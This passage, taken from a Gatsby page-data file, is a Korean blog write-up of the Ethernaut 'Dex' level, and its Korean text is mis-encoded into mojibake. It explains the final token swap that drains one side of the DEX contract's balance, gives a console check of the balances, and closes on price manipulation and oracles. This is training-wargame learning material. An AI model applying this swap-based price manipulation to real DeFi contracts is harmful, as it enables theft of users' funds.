url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAABJ0AAASdAHeZh94AAAAsElEQVQY02VQSY4DMQj0/x+biKWAdh8qAmdGmckBGRXUgld5siRYVcxMRgQRYCF55x7sB6/PvopVyeu6DgfgfW+uEDCfIOB0M5oqRYUQ52VFM6O7U1XnhftgcIxIG/RMRLj35uqETcyM4+SguzEsuHHcD+7Md0qfPkewPhJ2rRQwHqDjOHdCVWEovhIGMORO0+SeZdWfC1ZqMB4+Cw38P3nOBIbQ33IE9ey3YOaveNcLUzWCtIOdIxQAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"swap5.png\"\n        title=\"swap5.png\"\n        src=\"/static/4b6cdd657d4a84579e908b82304161c8/410f3/swap5.png\"\n        srcset=\"/static/4b6cdd657d4a84579e908b82304161c8/e9ff0/swap5.png 180w,\n/static/4b6cdd657d4a84579e908b82304161c8/f21e7/swap5.png 360w,\n/static/4b6cdd657d4a84579e908b82304161c8/410f3/swap5.png 561w\"\n        sizes=\"(max-width: 561px) 100vw, 561px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n</li>\n</ol>\n<p>ë§ˆì§€ë§‰ swapì€ ìš°ë¦¬ê°€ ê°€ì§€ê³  ìˆëŠ” token 65ê°œë¥¼ ì „ë¶€ swapí•˜ê²Œë˜ë©´ Dexê°€ ê°€ì§€ê³  ìˆëŠ” tokenì˜ ìˆ˜ë³´ë‹¤ ë§ì•„ì§ìœ¼ë¡œ 45ê°œë§Œ swapí•œë‹¤. ì—¬ê¸°ì„œ 45ë¼ëŠ” ìˆ«ìëŠ” <code class=\"language-text\">(amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))</code> ìˆ˜ì‹ì— balanceë“¤ì„ ë„£ì–´ ê³„ì‚°í•  ìˆ˜ ìˆë‹¤.</p>\n<ol start=\"6\">\n<li><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 496px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 3.888888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAABJ0AAASdAHeZh94AAAARElEQVQI1x3IQQ6AMAgAQf//TNOCBUoj2vOaOMc5IgJVZWUiKngzttzUqv/dnZyT3hvmxq5NnYs3H9yNMYwZwaWCmfEB3XdLD3+Wg28AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"lastswap_value_45\"\n        title=\"lastswap_value_45\"\n        src=\"/static/aa88ce5544f10e07e96813a4c75ceada/bb630/lastswap_value_45.png\"\n        srcset=\"/static/aa88ce5544f10e07e96813a4c75ceada/e9ff0/lastswap_value_45.png 180w,\n/static/aa88ce5544f10e07e96813a4c75ceada/f21e7/lastswap_value_45.png 360w,\n/static/aa88ce5544f10e07e96813a4c75ceada/bb630/lastswap_value_45.png 496w\"\n        sizes=\"(max-width: 496px) 100vw, 496px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></li>\n</ol>\n<p>ë§ˆì§€ë§‰ìœ¼ë¡œ contractì˜ token balanceë¥¼ í™•ì¸í•´ë³´ë©´ ë‘˜ì¤‘ í•˜ë‚˜ê°€ 0ìœ¼ë¡œ ë˜ì–´ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.</p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// ë‘˜ ì¤‘ í•˜ë‚˜ê°€ 0ì´ë©´ ëœë‹¤.</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">token1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> instance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x</span> <span class=\"token operator\">=></span> x<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">token2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> instance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x</span> <span class=\"token operator\">=></span> x<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n</code></pre></div>\n<p>tokenì¤‘ í•˜ë‚˜ì˜ balanceê°€ 0ì´ ëœ ê²ƒì„ í™•ì¸í–ˆë‹¤ë©´ ethernautìœ¼ë¡œ ëŒì•„ì™€ Submit instanceë¥¼ ëˆ„ë¥´ê³  ì¡°ê¸ˆ ê¸°ë‹¤ë¦¬ë©´ blockì´ mineë˜ê³ , ì•„ë˜ì™€ ê°™ì´ ëœ¨ë©° ë§ˆë¬´ë¦¬ëœë‹¤.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Ù©(- Ì®Ì®Ìƒ-Ìƒ)Û¶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"ë§ˆë¬´ë¦¬\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"ë§ˆë¬´ë¦¬ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë§ˆë¬´ë¦¬</h2>\n<p>ì´ë²ˆ ë¬¸ì œì™€ ê°™ì€ ê²½ìš°ëŠ” ìë³¸ì´ ë§ë‹¤ë©´ ì‰½ê²Œ ê°€ê²©ì„ ì¡°ì‘í•  ìˆ˜ ìˆê²Œëœë‹¤. ê·¸ë ‡ê¸° ë–„ë¬¸ì— ëŒ€ë¶€ë¶„ oracleì„ ì‚¬ìš©í•´ ì •ë³´ë¥¼ ì–»ì–´ì˜¨ë‹¤. ë‚˜ëŠ” Chainlink Oracleì— ëŒ€í•œ ê°œë…ì€ ìˆì§€ë§Œ ì§ì ‘ ì‚¬ìš©í•´ë³¸ ì ì´ ì—†ë‹¤. ë¬¸ì œë¥¼ í’€ë©´ kovan testnetì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ì½”ë“œë¥¼ ì£¼ëŠ”ë°, ì´ëŠ” oracleì„ ì§ì ‘ì ìœ¼ë¡œ ì‚¬ìš©í•´ë³´ëŠ” ì½”ë“œì´ë‹¤. ë‚˜ì¤‘ì— contractë¥¼ ì§¤ë•Œ ê·¸ë¦¬ê³  uniswapì„ ë¶„ì„í•  ë–„ë¥¼ ëŒ€ë¹„í•´ ë¯¸ë¦¬ ê³µë¶€í•´ë‘ë©´ ì¢‹ì„ ê²ƒ ê°™ë‹¤.</p>\n<p>ì´ë²ˆ ë¬¸ì œë¥¼ í’€ê¸°ì „ Uniswap V2 ì½”ë“œë¥¼ ë¶„ì„í•´ë´¤ëŠ”ë°, ì•„ì§ ë‚´ê°€ ë¶€ì¡±í•˜êµ¬ë‚˜ã… ã…  ë¼ëŠ” ê²ƒì„ ëŠë‚„ ìˆ˜ ìˆì—ˆë‹¤. Ethernautê°€ ëë‚œ í›„ ì—¬ëŸ¬ê°€ì§€ ì—¬ëŸ¬ ì¢…ë¥˜ì˜ contractë¥¼ ë¶„ì„í•˜ë©° ê¸°ìˆ ì„ ê¾¸ì¤€íˆ ì—°ë§ˆí•´ê°€ì•¼ê² ë‹¤!</p>\n<hr>\n<h2 id=\"ref\" style=\"position:relative;\"><a href=\"#ref\" aria-label=\"ref permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>REF</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n<li>Ethernaut 22 DEX walkthrough: <a href=\"https://medium.com/@this_post/ethernaut-22-dex-modified-version-writeups-4330c33a0743\">https://medium.com/@this_post/ethernaut-22-dex-modified-version-writeups-4330c33a0743</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">ìŠ¹ë¦¬ ì¡°ê±´</a></li>\n<li><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0-%EC%A0%84\">ë“¤ì–´ê°€ê¸° ì „</a></li>\n<li><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">ì½”ë“œ ë¶„ì„</a></li>\n<li><a href=\"#%ED%92%80%EC%9D%B4\">í’€ì´</a></li>\n<li><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">ë§ˆë¬´ë¦¬</a></li>\n<li><a href=\"#ref\">REF</a></li>\n</ul>\n</div>","frontmatter":{"date":"February 10, 2022","title":"(Ethernaut ì·¨ì•½ì  22) Dex","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/CTFs/22_dex_ethernaut/22_dex_ethernaut/"}},"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":"holyhansss/holyhansss.github.io"}}}}},"pageContext":{"slug":"/CTFs/21_shop_ethernaut/21_shop_ethernaut/","nextSlug":"/CTFs/20_denial_ethernaut/20_denial_ethernaut/","prevSlug":"/CTFs/22_dex_ethernaut/22_dex_ethernaut/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}